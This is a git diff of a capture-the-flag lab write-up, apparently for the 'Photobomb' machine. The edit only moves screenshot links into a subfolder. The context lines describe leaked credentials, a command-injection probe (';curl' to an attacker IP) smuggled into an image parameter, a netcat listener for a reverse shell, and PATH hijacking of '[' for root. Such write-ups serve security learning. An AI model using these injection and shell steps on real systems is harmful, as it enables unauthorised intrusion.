@@ -133,17 +133,17 @@ The **Click here!** button requests credentials:
 
 If cancelled:
 
-![web_login_cancel](web_login_cancel.png)
+![web_login_cancel](screenshots/web_login_cancel.png)
 
 It redirects to `/printer` but denies access due to missing credentials.
 
 Inspecting the source code:
 
-![web_code](web_code.png)
+![web_code](screenshots/web_code.png)
 
 Reveals a `photobomb.js` file:
 
-![web_photobomb_js](web_photobomb_js.png)
+![web_photobomb_js](screenshots/web_photobomb_js.png)
 
 Credentials found:
 
@@ -153,13 +153,13 @@ pH0t0:b0Mb!
 
 Login succeeds:
 
-![web_printer](web_printer.png)
+![web_printer](screenshots/web_printer.png)
 
 ### 2.3 Functionality
 
 The web offers a gallery with options to select filetype and dimensions for download:
 
-![web_printer_photo_config](web_printer_photo_config.png)
+![web_printer_photo_config](screenshots/web_printer_photo_config.png)
 
 Downloaded file viewed with Kitty terminal:
 
@@ -167,7 +167,7 @@ Downloaded file viewed with Kitty terminal:
 kitty +kitten icat test.jpg
 ```
 
-![kitten_test](kitten_test.png)
+![kitten_test](screenshots/kitten_test.png)
 
 Image resizing suggests a backend conversion process, similar to `convert`:
 
@@ -175,7 +175,7 @@ Image resizing suggests a backend conversion process, similar to `convert`:
 convert test.jpg -resize 500x500 new.jpg
 ```
 
-![kitten_new](kitten_new.png)
+![kitten_new](screenshots/kitten_new.png)
 
 ---
 ## 3. Foothold
@@ -192,7 +192,7 @@ Verifying with:
 ;curl+10.10.14.10
 ```
 
-![burpsuite](burpsuite.png)
+![burpsuite](screenshots/burpsuite.png)
 
 A callback is received, confirming execution.
 
@@ -200,7 +200,7 @@ A callback is received, confirming execution.
 
 Create a malicious `index.html` containing a bash reverse shell payload:
 
-![index_bash](index_bash.png)
+![index_bash](screenshots/index_bash.png)
 
 Modify the request:
 
@@ -216,7 +216,7 @@ nc -lvnp 443
 
 Send the request:
 
-![burpsuite_index_bash](burpsuite_index_bash.png)
+![burpsuite_index_bash](screenshots/burpsuite_index_bash.png)
 
 Reverse shell obtained.
 
@@ -245,17 +245,17 @@ Check sudo privileges:
 sudo -l
 ```
 
-![wizard_sudo_l](wizard_sudo_l.png)
+![wizard_sudo_l](screenshots/wizard_sudo_l.png)
 
 User can execute `/opt/cleanup.sh`.
 
 Inspect the script:
 
-![cleanup_code](cleanup_code.png)
+![cleanup_code](screenshots/cleanup_code.png)
 
 It incorrectly uses `[` without absolute path, making it exploitable.
 
-![command_square_bracket](command_square_bracket.png)
+![command_square_bracket](screenshots/command_square_bracket.png)
 
 ### 4.2 PATH Hijacking
 
@@ -267,7 +267,7 @@ chmod +x [
 nano [
 ```
 
-![square_bracket](square_bracket.png)
+![square_bracket](screenshots/square_bracket.png)
 
 Contents of file:
 
